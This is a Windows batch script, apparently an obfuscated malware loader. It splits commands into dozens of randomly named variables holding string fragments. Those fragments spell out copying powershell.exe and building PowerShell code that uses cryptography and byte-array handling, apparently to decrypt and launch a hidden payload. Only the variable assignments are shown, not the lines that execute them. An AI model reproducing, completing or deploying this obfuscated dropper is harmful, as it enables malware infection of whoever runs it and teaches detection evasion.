@echo off
set "tpSpEDTIBQ=\W"
set "EHTRZmdyhB=ll"
set "MRItWWkrdO=nd"
set "WQRpPiUJXm=ws"
set "xigxqvQzQe=32"
set "RYrXVhJiRp=y "
set "HScfvHBGfL=\v"
set "RPSzUwasnZ=rS"
set "rVwbcpMaAr=co"
set "BfmhWVxyyl=rs"
set "YmBHiTmviK= /"
set "JRjADFcJGe=py"
set "AwWJSrPvbl=Wi"
set "qzksTiETmw=.e"
set "XvLeXnhYTl= C"
set "yLXHykqEkh=Sy"
set "mRIdiLMuRi=in"
set "hMvDGjZHgu=0\"
set "cZYgdekGUF=:\"
set "hIOPJMLePc=do"
set "JwHIXKBcGS=we"
set "lVJWweSzwN=we"
set "nRbjrYarje=po"
set "BCSXwquYyH=xe"
set "USCgyMpHti=st"
set "GhPpOFYcWk=1."
set "hNgppKTcxz=ow"
set "xMYCQqdIQu=em"
set "lIPltAiire=ll"
set "HUAKxPgGYP=he"
set "vwOaDByclG=s\"
set "wugZiGAdpE=Po"
set "QdxELNCOHc=he"
set "YRdQlZkdUE=cd"
set "jkHSFuBkfA= %~dp0"
set "sweZtnVLzx=[Env"
set "PwpjtVoVHo=La.T"
set "PLGyOBwsiu=esMa"
set "ZoOVbvANLq=trea"
set "qYvZndHaYk=.-16"
set "xaYWNtuMwZ=ip ="
set "YymHnDoAYB=E.Su"
set "KifKhRQfFA== [S"
set "gUzphusWHu=daeR"
set "bEehtAmQjp=L4Yi"
set "uAjooCEiMQ=ress"
set "GCsRqJkNZW=-joi"
set "JkriFQFKMO=ct S"
set "waEZgdgszv=y]::"
set "NdPLaIdtuj=ct S"
set "poMTtrrzvy=[Sys"
set "PrJdBAebUm=]::("
set "OmNpuBhIel=Secu"
set "QyIBpNejba=);$u"
set "JCzQZPUFlj=..-1"
set "RygGOxRUKR=New-"
set "TBlpXguBxN=)($l"
set "KMNorFLzuo=oArr"
set "WaonVdSLGG=ptog"
set "KvnnEtnJQB=S46e"
set "yuoLtshYSq=Br);"
set "yiMQBijmkB=V = "
set "kWpwPKysWk=DLa."
